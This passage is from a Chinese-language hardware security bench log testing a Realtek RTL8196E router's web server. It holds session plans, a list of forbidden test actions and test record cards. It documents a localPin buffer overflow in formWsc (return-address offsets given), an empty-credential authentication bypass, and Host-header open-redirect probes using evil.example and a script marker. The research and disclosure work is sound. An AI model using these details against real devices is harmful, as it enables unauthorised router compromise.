**新的第 3 站順序**：`A3.1` → `A3.7` → `A3.13` → **`A3.2`** → `A3.14`（UDP）
→ `A3.15`（UPnP）→ `A3.16`（DNS）→ `A3.19` → `A3.18` → `A3.23`（抽樣）
→ `A3.11` → `A3.17` → `A3.22` → `A3.20` → **`A3.24`（reset，最後）**。

## 三、抽樣那一格從「一個」變成「五個，而且都有名字」

昨天寫的是「`formSchedule` 第一個，而且它是唯一的模擬側候選」。**今天那句話又被
自己的量測改了一次**：用空 body 重掃，死的是**五個** ——
`formSchedule`、`formAdvanceSetup`、`formDnsv6`、`formOpMode2`、`formSSH`，
而且五個死在同一條指令、同一個位址（`0x004725d0`，唯讀段裡的 `""` 字面量）。

**`A3.23` 的兩發不變，但第一發的對象換了措辭**：
`formSchedule` 而且**必須缺 `webpage`**（不是缺 `submit-url` —— 它根本不讀那個）。
第二發（2–3 個活著的 handler 在矽上也該活著）**一個字都不改**，
它仍然是這一場唯一一個會反過來否證 `tools/alignfix` 的測試。

## 四、進站前多出一個安全問題，而它是我們自己的工具

`tools/bench-probe.py` 拒絕「沒有 `submit-url` 的 POST」，理由就是這個機制。
**但 `formSchedule` 讀的是 `webpage`，所以那道防護把最需要擋的那一個放行了** ——
而它同時是**帶著格式完全正確的 `submit-url` 也會死**的那一個。
已改成逐 handler 的對照表（`REDIRECT_PARAM`）。

> 🔴 **這件事直接影響今晚**：舊版工具跑 `endpoints --allow-post` 會在
> `formSchedule` 上把 web server 打掉，而之後每一個端點都會回「連不上」——
> 那跟「端點不存在」長得一模一樣，也就是這支工具的說明第一段警告過的那件事。

## 五、`formWsc` 的 `localPin`，以及它為什麼不在今晚

今天在模擬環境上量到 `localPin` 800 bytes 讓 `$pc` 完全可控（偏移 509）。
**它不排進今晚，而理由不是危險，是順序**：

1. **它在公開映像上成不成立還沒量**（`v2.1.2` 那一發今天沒跑成，`reset` 被殘留
   行程擋下）。那個答案會改變它的整個份量，而它是一個**桌面**問題。
2. **prior-art 一次都還沒搜。** `localPin` 是 CVE-2019-19824 點名的參數，
   但那是命令注入不是溢位。三天前 `CVE-2023-34435` 就是同一個形狀的教訓。
3. 實機上驗它要一次斷電重開，而今晚已經有 30 列。

**今晚不碰它。**

## 六、其餘不變，包含那三個坑

`A3.13` 必須在 `A3.11` 之前、`P9-9` 排全場最後、`D-15` 的請求不進 committed 檔案
—— 三個全部不變。`formWsc` 那一發的請求本體同樣放
`$FWRE_WORK/disclosure/`，理由與 `D-15` 相同。

# 2026-08-18（二）W07 Day 5 —— 第三場桌面，沒有碰裝置，而它把進站的禁令表改了

**這一天沒有動裝置，所以沒有記錄卡。**它寫在這裡的理由跟 Day 3 一樣：**改掉下
一場計畫的那一半，必須在插電之前就在紀錄上**。今天改掉的不是順序，是**禁令表**
—— 那比順序嚴重。

## 一、`formWsc` 進 `HAZARDOUS`，而證據是 guest 自己的 syscall

昨天的第五節寫「`formWsc` 那一發今晚不碰」，理由有三個：公開映像上成不成立還沒
量、prior-art 一次都沒搜、驗它要一次斷電重開。**前兩個今天都消掉了，結論卻不變，
而理由整個換掉。**

今天用 `qemu-mips-static -strace` 把 guest 的系統呼叫直接錄下來。對
`/boafrm/formWsc` 送一發帶 `localPin` 的 POST，**在這一台跑的 build 上**：

```
2 open("/dev/mtdblock0",O_RDWR) = 5
2 write(5,0x49bab8,7495) = 7495
2 fork() = 18
18 execve("/bin/sh",{"sh","-c","flash write-current",NULL})
2 fork() = 24
24 execve("/bin/sh",{"sh","-c","sysconf wlaninit wlaninterface",NULL})
```

**它把 7,495 bytes 寫進 flash，然後把 wlan0 重新初始化。**在 2015 的
V2.1.2 上，同一發走的是另一條：

```
19 execve("/bin/sh",{"sh","-c","reboot -f",NULL})
```

兩種結果對今晚都是同一件事：**那一發之後，掃描裡排在它後面的每一個端點都會回
「連不上」**，而那正是 `bench-probe.py` 說明第一段警告的假陰性形狀。更麻煩的是
第一種——寫進去的東西**是持久的**，就算今晚根本沒跑到 `formSaveConfig`。

**`formWsc` 已經加進 `HAZARDOUS`，理由逐字寫在表裡。**`endpoints --allow-post`
從現在起會跳過它並把跳過記進 transcript；要跑它必須另外加
`--allow-destructive` 並且說出理由。**今晚不加。**

> 🔴 這一條是今天唯一一件「如果沒寫下來，今晚會踩到」的事。昨天的工具會把這一發
> 送出去，而它排在 57 個名字的中段。

## 二、昨天那三個不做的理由，兩個已經失效，第三個換人

| 昨天寫的理由 | 今天的狀態 |
|---|---|
| 公開映像上成不成立沒量 | **量了，成立。**`ra` 在 513（這一台是 509），暫存器組一樣，框架大一個 word |
| prior-art 一次都沒搜 | **搜了，已經公開。**`CVE-2025-4462` 就是 `/boafrm/formWsc` 的 `localPin` 溢位 |
| 驗它要一次斷電重開 | **不變**，而且現在還多一條：它會寫 flash |

**所以「今晚不碰 `formWsc`」這個結論一個字都不用改，但支撐它的三句話裡有兩句已經
不是真的。**這件事本身要留在紀錄上：一個結論可以在理由全部換掉之後還是對的，而
如果不寫下來，下一次就會拿一個已經死掉的理由去擋別的事。

## 三、`A3.23` 的兩發不變

昨天寫的「五個，而且都有名字」——`formSchedule`、`formAdvanceSetup`、
`formDnsv6`、`formOpMode2`、`formSSH`——**在這一台上一個都沒有變**。今天量到
V2.1.2 上是**七個**（多了 `formNtp` 和 `formWlanSetup`），但那是 2015 的 build，
不是今晚要碰的東西。

**第一發仍然是 `formSchedule` 而且必須缺 `webpage`；第二發一個字都不改。**

不過廠商原始碼今天給了一個更好的說法可以寫進卡片：那個 `strcpy` 在
`OK_MSG(url)` 巨集裡，而它的兄弟 `ERR_MSG(msg)` 根本不碰 `url`。**所以「哪些
handler 會死」等於「哪些 handler 會走到成功套用」**，這比昨天的「沒有提早 return」
精確得多，而且卡片的預測可以照這個寫。

## 四、模擬側今天修好了三件，其中一件昨天擋掉了整場量測

1. **`reap` 根本沒在 reap。**它 exit 1、什麼都不印、什麼都不殺，而且只在 root 下
   才會這樣——`reap` 本來就只能用 root 跑。昨天「殘留行程擋下 reset」之後卡住，
   原因就是這個。
2. **`reset` 印出來的修復指令，它自己的解析器不收。**它印 `--profile 2018`，而
   profile 叫 `unit-2018`；`qemu-env-2018` 只是目錄名。
3. **`chroot` 不是隔離。**guest 走到 `reboot -f`，那個 syscall 直接打到宿主核心，
   把整台 WSL 關掉三次。現在所有 guest 都在 `unshare --pid --fork` 底下跑。

**第三件對今晚沒有直接影響**（今晚驅動的是真的裝置，不是模擬），但它換掉一句話：
**「這一發只會把模擬器弄壞」是錯的**——那一發在真機上會做的事跟在模擬器上一樣，
差別只在宿主是誰。

## 五、`A1.9` 跑了，而它寫好之後從來沒有被執行過

昨天補了 `A1.5`–`A1.9` 五節桌面步驟，並且加了一個「活著的列必須有步驟」的檢查。
**今天第一次真的去跑 `A1.9`，它錯了兩次**：

1. 沒帶 `--alignfix`，`flash set` 印出 `Bus error` 之後**不會結束**，就一直卡著；
2. 它叫人拿 `qemu-env.sh diff` 的位移去跟 `fwrecon compcs` 的欄位表對，**但那兩個
   不在同一個座標系**——設定區是壓縮的（7,478 → 45,226）。

第一次跑出來的東西差 2 bytes、看起來「差不多對」，那比明顯錯還糟。

> 🔴 **場次之前把步驟寫出來是必要的，不是充分的。**昨天那條規則抓得到「有結果卻
> 沒步驟」的列，抓不到「有步驟但從來沒跑過」的節——而沒跑過的步驟是一個關於指令的
> 預測，不是指令。

## 六、其餘不變，包含那三個坑

`A3.13` 必須在 `A3.11` 之前、`P9-9` 排全場最後、`D-15` 的請求不進 committed 檔案
—— 三個全部不變。`A3.2` 前移（601 秒視窗）也不變。

**今晚新增的唯一禁令是 `formWsc`。**

# 2026-08-18（二）W07 Day 5 補記 —— 上面那一格寫得不準確，而這是只追加檔案的更正方式

**這一則不改上面任何一個字，只加在後面。**`BENCH-LOG.md` 是逐字證據，
更正它的方式是追加，不是編輯 —— 這一則本身就是那條規則的示範。

## 要更正的是哪一格

Day 5 第二節那張表裡的這一列：

| 昨天寫的理由 | 我今天寫的 |
|---|---|
| prior-art 一次都沒搜 | 搜了，已經公開。`CVE-2025-4462` 就是 `/boafrm/formWsc` 的 `localPin` 溢位 |

**右欄不完整，而缺的那一半才是重點。**正確的說法是：

> **那個 CVE 從 W04 起就在這個 repo 裡。**`notes/prior-art.md` 有那一列，
> `notes/cve-status.md` 同一條標 🟥，而且寫著
> "The same line of source as 3987, **and identical in the 2015 image**"。

所以「一次都沒搜」這句話在 Day 4 寫下來的當下就是錯的 —— 搜過，寫在登記簿裡，
只是寫發現的人沒有打開它。我今天做的事是去**網路上**問一個自己檔案裡已經有答案的
問題，而網路同意了。

## 對進站的影響：沒有

`formWsc` 今晚不碰、`formWsc` 進 `HAZARDOUS`、`A3.23` 兩發不變 —— **三件全部不變**，
因為它們是從 syscall trace 推出來的，不是從「這是不是新發現」推出來的。

## 唯一變好的一件事

`cve-status.md` 那句 "identical in the 2015 image" 是一個**靜態預測**。
今天在那個映像上量到 `ra = 513`、`s0`–`s6` 依序、`s7` 未動。
**一個被證實的靜態預測，比一次「重新發現 CVE」值錢**，而那才是這一天真正的量測結果。

規則已經改在流程上：`docs/disclosure.md` 多了第 0 步 —— 寫發現之前先開
`notes/prior-art.md`，再開 `cve-status.md`，最後才是外部來源。

# 2026-08-18（二）W07 進站場次 —— 計畫，寫在插電之前

**這一則寫在裝置上電之前，而且它改掉了 `runsheet.md` Part B `B-W07 增補` 的進站
順序。** 改的理由是一次對帳，不是一個想法：把 `runsheet.md` Part A 每一節標題的
`（關 …）` 逐節解析出來，跟 `rtcase todo --week W07` 的未結清單求交集，發現順序表
漏掉三列，而登記簿另外把四列算成已做。

## 一、今晚到底有幾列 —— 三個數字都出現過，而它們指的不是同一件事

| 來源 | 數字 | 它其實在講什麼 |
|---|---|---|
| `make todo WEEK=W07` | **29** | 登記簿裡還是 ⬜ 的列。**含 2 列桌面**（`P4-6`、`P5-2`），**不含**只有 `emulated` 證據的那 4 列 |
| 本檔 Day 4 第一節 | **30** | 寫下來的當時是對的 —— 那時登記簿是 28/58。Day 5 關掉 `P8-23` 之後就少一列，而那一行沒有人回頭改，本檔也不該改 |
| 本節 | **31** | **今晚真正要動裝置的列數** |

31 = 27（29 列 ⬜ 扣掉 2 列桌面）+ 4（登記簿說已做、但只有 `emulated`）。

**那 4 列是 `make todo` 看不見的。** `tools/rtcase.py` 的 `week_summary()` 判斷
`done` 的條件是 `if c["id"] in latest` —— 只問「這個 id 有沒有結果」，不問結果是
哪一級。而同一支檔案自己的註解寫著 `EMULATED_CONFIRMED_MARK` **"it never becomes
the tick"**。兩件事在同一個檔案裡互相矛盾，而輸出的是前者：

| 列 | 現況 | 今晚哪一節在矽上重量 |
|---|---|---|
| `P2-9` | `confirmed` / `emulated` | `A3.13` |
| `P8-5` | `confirmed` / `emulated` | `A3.13` |
| `P1-7` | `partial` / `emulated` | `A3.23` |
| `P5-6` | `partial` / `emulated` | `A3.23` |

`P5-6` 自己的 note 裡有一句話把這件事講死了：**「反證條件（模擬下的崩潰在實體機上
重現不了）只有實機能答，那是 `A3.23`」**—— 一列的反證條件明寫著只有實機能答，而它
在封閉清單上算已結案。

**今晚的處理**：這四列在 `A3.13` / `A3.23` 跑完之後用 `rtcase record` **再錄一次**，
`--evidence dynamic`。`record` 是 append，`latest_results` 取最後一筆，ledger 會顯示
`x2` —— 這是工具本來就設計好的路，不是繞過它。

## 二、順序表漏掉的三列，以及今晚怎麼補

`B-W07 增補` 的第 3 站 ⑤ 是 `A3.11` → `A3.17` → `A3.22` → `A3.20` → `A3.24`。

1. **`A3.21` 不在裡面**，而它關的 `P8-17`（線上明文憑證）與 `P8-20`（`iwpriv` 私有
   ioctl）兩列都還是 ⬜。**今晚插在 `A3.20` 之前** —— `A3.20` 的 Slowloris 打掉 `boa`
   之後，`A3.21` 要抓的明文憑證就沒有東西可抓，順序反過來會量到一個假陰性。
2. **第 2 站整站沒有排**，所以 `A2.4` 關的 `P9-4`（搶重開機瞬間的救援窗口）沒有位置。
   它要板子停在 `<RealTek>`，是另一個上電狀態。**今晚開場先跑第 2 站**，多燒一次
   上電循環換掉這一列。
3. `P5-2`（MIPS ret2libc）**今晚仍然不做**，理由不變：誠實的問法是關於這台裝置的，
   不是關於 `qemu-user` 的 mmap 佈局。它會留成 W07 唯一一列 ⬜。

## 三、三次上電，而每一次的出站狀態都寫在這裡

| 循環 | 站 | 順序 | 關掉 |
|---|---|---|---|
| **1** | 第 2 站 `<RealTek>` | `A2.2` catch → `A2.3` 64 KiB 快照 → `A2.4` 救援 → **拔電** | `P9-4` |
| **2** | 第 3 站 boot 1 | `A3.1.3` 證直連 → `A3.7` → `A3.13` → **拔電** | `P2-9` `P8-5`（升級成 dynamic） |
| **3** | 第 3 站 boot 2 | `A3.2` → `A3.14` → `A3.15` → `A3.16` → `A3.19` → `A3.18` → `A3.23` → `A3.11` → `A3.17` → `A3.22` → **`A3.21`** → `A3.20` → `A3.24` | 其餘 25 列 |

**為什麼第 3 站要拆成兩次上電**：`A3.2` 的先決條件是**板子斷電**，因為它量的就是
冷開機。`增補` 把 `A3.2` 前移到 `A3.13` 之後，那個「前移」是相對於偵察，不是相對於
全場第一件事。`A3.1` / `A3.7` / `A3.13` 三節不寫、不斷電、便宜，先跑掉；然後拔電，
讓 `A3.2` 拿到一次乾淨的冷開機，而 `P2-11` 的 601 秒視窗從那一刻開始算。

`A2.5` / `A2.6` **今晚不跑**：它們是全檔僅有的兩節會寫 flash，而它們關的 `P0-3`
與 `P10-10` 已經結案。今晚不需要不可逆的動作。

## 四、進站前就成立的禁令，逐條抄在這裡

1. **`formWsc` 是 `HAZARDOUS`，今晚不加 `--allow-destructive`。** 理由是 Day 5 的
   syscall trace：在這一台跑的 build 上，一發帶 `localPin` 的 POST 會
   `open("/dev/mtdblock0", O_RDWR)`、`write(…, 7495)`、`fork` 出
   `flash write-current`。`endpoints --allow-post` 會跳過它並把跳過寫進 transcript。
2. **`A3.13` 必須在 `A3.11` 之前。** `A3.11.2` 把管理密碼設成空字串之後，`A3.13`
   量到的會是 `D-4` 而不是 `D-15` —— 兩個缺陷產生一模一樣的「不帶密碼就進得去」，
   分辨它們的是錯密碼那一列，而那一列只在密碼非空時有意義。今晚的循環 2 / 循環 3
   分開，這一條自動成立。
3. **`P9-9` 全場最後。** reset 會把 `COMPCS` 蓋回 `COMPDS`，它抹掉的是前面每一項
   站著的地面，包含 `P0-5` 的 4 / 343 基準。
4. **`D-15` 與 `formWsc` 的請求本體不進 committed 檔案**，放
   `$FWRE_WORK/disclosure/`。
5. **每一張卡片的反證欄不可以空白** —— `tools/check-benchlog.py` 在 `make ci` 裡機械
   執行這一條。今晚的卡片從 **`T-38`** 開始編。

## 五、插電之前已經做完、而且驗過的事

| 做了什麼 | 驗證 |
|---|---|
| `usbipd attach --wsl` 兩個裝置 | `/dev/ttyUSB0` 是 `crw-rw---- root dialout 188, 0`；`enxfc19286184c9 DOWN fc:19:28:61:84:c9` —— 與 `A2.1` 的預期輸出逐字相符 |
| WSL VM keepalive | `wsl -d Ubuntu-24.04 -- sleep 14400` 掛著。VM 一停 USB 裝置就退回 Windows |
| `make doctor` | 25 ok、3 not applicable、**0 to fix**。三個 n/a 全部是「網卡還沒設位址、還沒有路由」，那是 `A3.1` 的工作 |
| 遠端 CI | `fcc036d`（main）七個 job 全 success。**但那是回頭補的綠**：PR #16 建立於 11:10:20Z、merge 於 11:10:28Z，中間 8 秒，當時 `bench tooling refuses what it claims to refuse` 與 `toolchain image builds` 兩個 job 還沒開始跑。詳見 `PROGRESS.md § Corrections` |

**網卡留在 WSL 裡不是方便問題。** 它若留在 Windows 側，Windows 會從這台拿到 DHCP
位址，測試會看起來正常而唯一的破綻是 `ttl=63` 不是 64 —— 儀器 bug 21，2026-08-17
真的發生過。

## 紀錄卡 —— 第 2 站（循環 1）

```text
T-38  P0-2   抓 bootloader（A2.2）                        2026-08-18 19:24
可行性: ★★★★★   驗證狀態(測前): dynamic   依據: W05 T-01 已關，本場為進站前提
送出（逐字）: python3 -u tools/console-dump.py catch --port /dev/ttyUSB0 --window 300 -v
原始回應:
      ok    <RealTek> - the boot loader is ours
            ---RealTek(RTL8196E)at 2014.04.22-16:22+0800 v1.3 [16bit](400MHz)
      ok    input buffer drained (the ESC stream leaves ESCs queued)
      >>>   ?   -> 16 條指令完整印出，全程無亂碼
觀測通道 1（console）: banner 與 W05 T-01 逐字相同
觀測通道 2（上電次數）: 一次上電命中，未用到三次上限的第二次
UART console 當下輸出: <RealTek> 提示穩定
判定: ✅ 成立
反證檢查: 測前寫「the board booted past the interrupt window → 板子沒有真的斷電過；
          nothing came back at all → TX/RX 接反或 port 錯」，
          實際看到乾淨的 <RealTek> 與完整指令表，兩個失敗字樣都沒有出現
這一步燒掉了什麼: 一次開機循環（本場第 1 次）
驗證狀態(測後): dynamic   下一步: A2.3

T-39  P0-10  64 KiB 設定區快照（A2.3）                    2026-08-18 19:27
可行性: ★★★★★   驗證狀態(測前): dynamic   依據: W05 T-02
送出（逐字）: python3 -u tools/console-dump.py dump --at-prompt \
              --flash 0x0 --length 0x10000 --ram 0x81000000 --chunk 16384 -o <snap>
原始回應:
      ok    control matched: 0b f0 00 04
      ok    65536 bytes -> config-region-20260818-1927-pre.bin
      ok    sha256  450f99361a480500f5ac7e1b7a924fd5c85c6d95395587d24f29af04b94144fd
      ok    4 chunks, 0 needed a re-read, 1.9 min
觀測通道 1（分區歸因，不過任何解碼器）:
      0x00000-0x06000  boot loader                            UNCHANGED
      0x06000-0x08000  H601 (MAC + 射頻校準)                  UNCHANGED
      0x08000-0x0c000  COMPDS  5615 bytes 動（0x0800b..0x09d5e）
      0x0c000-0x10000  COMPCS  5615 bytes 動（0x0c00b..0x0dd5e）
觀測通道 2（語意層，過解碼器）: 兩區各只動 2 欄 —— SYSCMD_SELECT、WPS_FIRST
      對照 config-region-20260817-post.bin（8/17 11:42，W05 下午收工）
判定: ✅ 成立
反證檢查: 測前寫「H601 動了 → 停，這台的 MAC 與射頻校準沒有任何映像可以還原；
          或出現一筆紀錄裡沒有的欄位差異 → 走事件處理程序」，
          實際 H601 與 loader 逐 byte 未動；兩個變動欄位在 W06 的 P0-10 結果 note 裡
          指名寫過（"COMPCS moved in exactly two, SYSCMD_SELECT and WPS_FIRST,
          which are the two handlers that were fired"）—— 已歸因
這一步燒掉了什麼: 沒有。純讀（FLR + DB）
驗證狀態(測後): dynamic   下一步: A2.3.4
⚠️ **11,230 raw bytes = 2 個欄位。** LZSS 壓縮流前段動一個欄位，後面全部位移 ——
   raw byte 數與欄位數不在同一個座標系，這與 P8-23（8/18 桌面）量到的是同一件事。
   **只看 cmp 的 byte 數會把 2 個欄位讀成一場入侵。**

T-40  P0-5   IoC 預檢（A2.3.4）                            2026-08-18 19:31
可行性: ★★★★★   驗證狀態(測前): dynamic   依據: W05 T-03、W06 新基準
送出（逐字）: bash tools/ioc-precheck.sh <snap>
原始回應:
      COMPCS: checksum_ok=True verdict=consistent ring_fill_agrees=True entries=344
      COMPDS: checksum_ok=True verdict=consistent ring_fill_agrees=True entries=344
      common entries: 343
      differing     : 0
判定: ✅ 成立
反證檢查: 測前寫「差異數不等於上一場記下的數字，且無法歸因 → 資安事件，測試中止；
          或 checksum_ok=False → 停，裝置自己也會拒絕這份 blob」，
          實際 differing = 0，與 W06 收工記下的 0 / 343 相同；兩區 checksum_ok 皆 True
這一步燒掉了什麼: 沒有。純讀
驗證狀態(測後): dynamic   下一步: A2.4
🔴 **測前我把基準寫成 4 / 343，那是錯的**（更正見本場「一、基準抄錯了」）。
   實測 0 是對的。**如果照 4 走，這一格會被讀成資安事件而中止全場。**

T-41  P9-3   救援模式 —— 陽性對照（A2.4）                  2026-08-18 19:33
可行性: ★★★★★   驗證狀態(測前): dynamic   依據: W05
送出（逐字）: python3 -u tools/console-dump.py rescue --at-prompt --ip 10.1.1.1 -o rescue.json
原始回應:
      'AUTOBURN: 0'        -> Unknown command !
      'AUTOBURN 0'         -> AutoBurning=0
      'IPCONFIG:10.1.1.1'  -> Unknown command !
      'IPCONFIG 10.1.1.1'  -> Now your Target IP is 10.1.1.1
觀測通道 1（主機端 ARP）: 10.1.1.1 dev enxfc19286184c9 lladdr 56:0a:01:01:01:e8 REACHABLE
觀測通道 2（kernel 計數器）: rx_packets 0 -> 1
觀測通道 3（ICMP）: 3 packets transmitted, 0 received —— **預期如此**
判定: ✅ 成立
反證檢查: 測前寫「ping 有回應 → 那不是 loader 在回話，是別的東西在這個位址上，停下來查」，
          實際 0 received；成立的判據是 ip neigh REACHABLE 加 rx_packets 由 0 變 1，
          而那兩個來源不共用程式碼
這一步燒掉了什麼: RAM 變數 AUTOBURN 與 IPCONFIG，斷電即消。**沒有上傳任何東西**
驗證狀態(測後): dynamic   下一步: P9-4 需要另一半——一次不敲序列埠的冷開機被動抓包
★ 那個 lladdr 不是網卡燒錄位址：`0a 01 01 01` 就是 `10.1.1.1`，loader 從
  IPCONFIG 給的位址合成出來。**這張卡是 P9-4 的陽性對照，不是 P9-4 本身。**
```

## 一、基準抄錯了，而它會在 `T-40` 那一格中止全場

**本場「四、進站前就成立的禁令」第 3 條寫「包含 `P0-5` 的 4 / 343 基準」——
那個數字是錯的，正確是 `0 / 343`。**

`4 / 343` 是 2026-08-17 **上午**的值。當天下午的 POST 輪把 `COMPDS` 覆寫成
`COMPCS`，那 4 筆差異當場歸零，W05 收工那一格白紙黑字寫著
**「IoC 凍結條件 | 不再是 4 / 343,是 0 / 343」**。W06 收工再確認一次同一個數字。

**同一個錯誤在本檔裡是第二次出現**：2026-08-18 早上那則「W07 進站場次的計畫」
也寫「`P0-5` 的 IoC 基準（4/343）也歸零」。兩則都是從 `runsheet.md` `A2.3.4` 那段
🔴 註記的**例子**抄來的，而那段註記的正文恰好在講不可以這樣做：
「**判準是『跟上一場記下的數字相同』。看到不是 4 就當資安事件是錯的**」。

> 🔴 **一份文件用一個具體數字當例子，讀的人會把例子抄成常數。**
> 註記本身是對的，它的示範值是有毒的。`ioc-precheck.sh` 的輸出結尾已經印了
> 正確的說法（"It is not a constant: it was 4 of 343 until 2026-08-17, and
> 0 of 343 after"）—— **工具比文件準，因為工具的那一行是量出來之後補上去的。**

**這一則用追加更正，不改上面那一格**，理由與 Day 5 補記相同。

## 紀錄卡 —— 第 3 站 boot 1（循環 2）

```text
T-42  P2-7 P2-8  憑證與 session —— 兩個來源位址（A3.7）        2026-08-18 19:41
可行性: ★★★★★   驗證狀態(測前): dynamic   依據: W05
送出（逐字）: 三發 GET /password.htm —— 不帶憑證 / 帶真憑證 / 帶錯密碼；
              然後同樣兩發各從 10.1.1.100 與 10.1.1.101 送；然後 50 發錯密碼再 1 發正確
原始回應:
      none  HTTP/1.0 302 Redirect | Location: http://10.1.1.1/login.htm |
      good  HTTP/1.1 200 OK |
      bad   HTTP/1.0 302 Redirect | Location: http://10.1.1.1/login.htm |
      10.1.1.100 with 200 / without 302     10.1.1.101 with 200 / without 302
      after 50 wrong, the 51st correct one: 200
觀測通道 1（header 全掃）: **Set-Cookie 一行都沒有出現**
觀測通道 2（路由表）: ip route get 10.1.1.1 -> dev enx… src 10.1.1.100，**沒有 via**
判定: ✅ 成立
反證檢查: 測前寫「good 那一行不是 200 → 停，不要重試：要嘛解碼器錯了，要嘛這台被改過密碼」，
          實際 good = 200；憑證是從今晚這份 64 KiB 快照自己解出來的（USER_NAME / USER_PASSWORD
          各 5 字元、皆非空），不是猜的
這一步燒掉了什麼: 沒有。這個 build 沒有 session 可寫，登入不落地
驗證狀態(測後): dynamic   下一步: A3.13
★ 「成功登入之後，同一個位址不帶憑證仍然被擋」= 沒有 session。
  **而這一列今晚有第二個用途**：它同時是 A3.2.4（P2-11）的前提檢查 ——
  bad = 302 證明儲存密碼非空，所以 A3.13 與 A3.2.4 量到的不會是 D-4。

T-43  P2-9  未初始化的憑證對，在矽上（A3.13.1）              2026-08-18 19:44
可行性: ★★★★    驗證狀態(測前): emulated   依據: notes/uninit-credential-pair.md
送出（逐字）: 六發 GET /blank.htm，請求本體照
              $FWRE_WORK/disclosure/D-uninitialised-credential-pair.txt（repo 之外，mode 600）
原始回應:
      LABEL                          CODE  BYTES  SHA256-16
      none (no header)               302   132    ada993dce7920b0a
      real (真憑證)                  200   333    bc56c91c2cd06b83
      wrongpw                        302   132    ada993dce7920b0a
      bypass  (兩半都空)             200   333    bc56c91c2cd06b83
      empty:t (帳號空、密碼非空)     302   132    ada993dce7920b0a
      t:empty (帳號非空、密碼空)     302   132    ada993dce7920b0a
觀測通道 1（逐 byte）: bypass 的 body 與 real 的 body cmp IDENTICAL
觀測通道 2（有真內容的閘門頁）: /password.htm  none 302/132 -> bypass 200/**5332**
判定: ✅ 成立
反證檢查: 測前寫「bypass 回 302 → 那塊堆疊在裝置上不是零，D-15 降級成
          『模擬環境與裝置不一致』，notes/uninit-credential-pair.md §3 的機制論證要改寫」，
          實際 bypass = 200 且與真憑證逐 byte 相同
這一步燒掉了什麼: 沒有。六個 GET，不寫、不斷電
驗證狀態(測後): **dynamic**   下一步: A3.13.2
🔴 **多打的那兩發是這張卡最重要的部分，而登記簿沒有要求它們。**
   模擬那一場只打四發。四發分不出「比對被跳過」和「比對執行了而且命中一塊沒人寫過的
   緩衝區」—— 兩者都會讓 bypass 回 200。**empty:t 與 t:empty 兩發都是 302，
   所以比對確實執行了。** 這才是把 D-15 跟 D-4 分開的那一刀。
⚠️ **模擬下 302 的 body 是 138 bytes，這台是 132。** 差的是 Location 的長度，
   不是這條發現。**先量到差異再解釋它，不要因為「大致相同」就跳過。**

T-44  P8-5  check_host 存在、嚴格、被執行、而且從不執行（A3.13.2）  2026-08-18 19:45
可行性: ★★★★    驗證狀態(測前): emulated   依據: notes/host-header-and-redirect.md
送出（逐字）: 五發 GET /login.htm，Host 分別為一般主機名、開頭連字號、連續點、
              底線、以及完全不帶 Host；再兩發 GET /blank.htm 看轉址反射
原始回應:
      [evil.example] 200   [-evil.example] 200   [evil..example] 200
      [evil_example] 200   [（不帶）]      200
      HTTP/1.0 302 Redirect
      Location: http://evil.example/login.htm
      Location: http://a%22%3e%3cscript%3ex%3c/script%3eb/login.htm
判定: ✅ 成立
反證檢查: 測前寫「任何一個回 400 → vhost_root 在真機上不是 NULL，
          P8-6（rebinding）的前提要重新評估」，實際五個全部 200，一個 400 都沒有
這一步燒掉了什麼: 沒有。七個 GET
驗證狀態(測後): **dynamic**   下一步: 拔電，進 A3.2
★ **五個裡有三個是 check_host 會拒絕的形狀**（開頭連字號、連續點、底線），
  而它們全部 200 —— 所以那個函式沒有被執行，不是「執行了而且放行」。
★ **D-14 反射成立**：Host 被抄進 Location，這是 open redirect。
  帶標記的 Host 回來時是 URL-encode 過的，**所以不是 XSS** —— 與模擬一致。

T-45  P9-4  loader 在未被打斷的開機裡上不上網路（被動抓包，第 1 次） 2026-08-18 19:36
可行性: ★★★★    驗證狀態(測前): unverified   依據: reports/bootloader-unit-2018.json
送出（逐字）: 什麼都沒送。**序列埠全程沒有被任何程序開啟**（fuser 回 nobody），
              tcpdump 在通電之前就架好，-U -s 0 全錄
原始回應（pcap，955 個封包）:
       4   5.011888  我的網卡 -> 56:0a:01:01:01:e8  ARP Who has 10.1.1.1?
       5   6.036001  我的網卡 -> 56:0a:01:01:01:e8  ARP Who has 10.1.1.1?
       7   7.059995  我的網卡 -> 56:0a:01:01:01:e8  ARP Who has 10.1.1.1?
       9  10.069453  我的網卡 -> Broadcast          ARP Who has 10.1.1.1?
      17  19.947054  <裝置 Linux MAC，per-unit，不寫入> -> 我的網卡  ARP 10.1.1.1 is at …
      19  19.948653  10.1.1.1 -> 10.1.1.100  TCP 80 -> 37542 [RST, ACK]
觀測通道 1（tshark 過濾）: udp.port==69 || tftp -> **0 個封包，全場**
觀測通道 2（tshark 過濾）: 裝置為來源、t < 12s -> **0 個封包**
判定: 🔶 部分（一次開機成立，等第二次獨立冷開機）
反證檢查: 測前寫「隔離網段上被動錄到 loader 送 ARP 或 TFTP 請求，而全程沒有碰序列埠
          → loader 在 Linux 之前就服務網路，這一條的嚴重度要整個上調」，
          實際 t=19.947s 之前裝置送出零個 frame，TFTP 全場 0 個
這一步燒掉了什麼: 沒有。純被動
驗證狀態(測後): unverified -> 待第二次冷開機   下一步: 循環 3 再錄一次
★ **前三發是免費的陰性對照，而它不是設計出來的，是 ARP 快取送的。**
  我的主機拿快取裡 `56:0a:01:01:01:e8` 去**單播**問 —— 那正是十分鐘前
  `A2.4` 打完 `IPCONFIG` 之後 loader 自己宣告的位址。**直接問它，它沒有回答。**
  所以 loader 的網路堆疊斷電就沒了，只有敲序列埠打 IPCONFIG 才會存在。
★ 裝置送出的第一個 frame 來自真實網卡 MAC（Zioncom），不是 loader 合成的
  `56:0a:…` —— **兩個階段用不同的 MAC，那本身就是「這不是同一個網路堆疊」的證據。**
```

## 紀錄卡 —— 第 3 站 boot 2（循環 3）

```text
T-46  P1-12  冷開機計時（A3.2）                             2026-08-18 19:45
可行性: ★★★★★   驗證狀態(測前): dynamic   依據: W05 的 38.76 s
送出（逐字）: bash tools/coldboot-timing.sh /dev/ttyUSB0 10.1.1.1 <dumps>
原始回應:
      ok    first HTTP 200:  32.18 s from the console's first line
      FAIL  the kernel printed no 'Kernel command line:' line at all
      6:…  ---RealTek(RTL8196E)at 2014.04.22-16:22+0800 v1.3 [16bit](400MHz)
      33:… init started: BusyBox v1.13.4 (2018-01-10 14:56:45 CST)
      67:… boa: starting server pid=338, port 80
判定: ✅ 成立
反證檢查: 測前寫「明顯超過 40 秒 → bootlog 的時間戳不是牆鐘時間，或有服務是延遲啟動的」，
          實際 32.18 s，比 W05 的 38.76 s 更快，兩次都在 40 秒內
